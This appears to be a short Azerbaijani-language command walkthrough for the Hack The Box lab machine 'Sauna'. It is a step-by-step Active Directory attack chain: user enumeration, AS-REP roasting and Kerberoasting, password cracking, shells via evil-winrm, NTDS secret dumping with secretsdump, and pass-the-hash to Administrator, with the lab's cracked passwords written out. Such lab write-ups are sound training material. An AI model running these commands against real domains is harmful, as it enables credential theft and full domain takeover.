HTB Sauna üçün qısa command flow:

```bash
sudo nmap -sC -sV 10.10.10.175 -oN nmap-basic.txt -v
```

Açıq portları, servisləri və AD olduğunu tapır. ([Medium](https://saisathvik1.medium.com/hackthebox-sauna-walkthrough-8de1355be52b))

```bash
crackmapexec smb 10.10.10.175
```

Domain adını və SMB məlumatlarını yoxlayır.

```bash
kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt
```

Hazırladığın username listindən valid user tapır.

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith -no-pass -dc-ip 10.10.10.175
```

AS-REP roastable user üçün Kerberos hash alır. ([Medium](https://saisathvik1.medium.com/hackthebox-sauna-walkthrough-8de1355be52b))

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith -no-pass -dc-ip 10.10.10.175 > hash.txt
```

Tapılan AS-REP hash-i fayla yazır.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Hash-i crack edib `fsmith` passwordunu tapır.

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```

`fsmith` hesabı ilə Windows shell alır. ([Medium](https://saisathvik1.medium.com/hackthebox-sauna-walkthrough-8de1355be52b))

```bash
impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:'Thestrokes23' -dc-ip 10.10.10.175 -request
```

Kerberoasting üçün SPN-li hesabların TGS hash-lərini alır.

```bash
impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:'Thestrokes23' -dc-ip 10.10.10.175 -request > tgs.txt
```

TGS hash-i fayla saxlayır.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs tgs.txt
```

Kerberoast hash-i crack edir.

```bash
upload winPEASx64.exe
```

Evil-WinRM içində winPEAS-i targetə upload edir.

```powershell
.\winPEASx64.exe
```

Windows privesc üçün saved credentials və misconfiguration axtarır.

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
```

`svc_loanmgr` credentialı ilə NTDS/LSA secret-ləri dump etməyə çalışır. ([Medium](https://saisathvik1.medium.com/hackthebox-sauna-walkthrough-8de1355be52b))

```bash
evil-winrm -i 10.10.10.175 -u Administrator -H <ADMIN_NT_HASH>
```

Administrator NTLM hash ilə Pass-the-Hash edib admin shell alır.

```powershell
type C:\Users\fsmith\Desktop\user.txt
```

User flag-i oxuyur.

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

Root flag-i oxuyur.
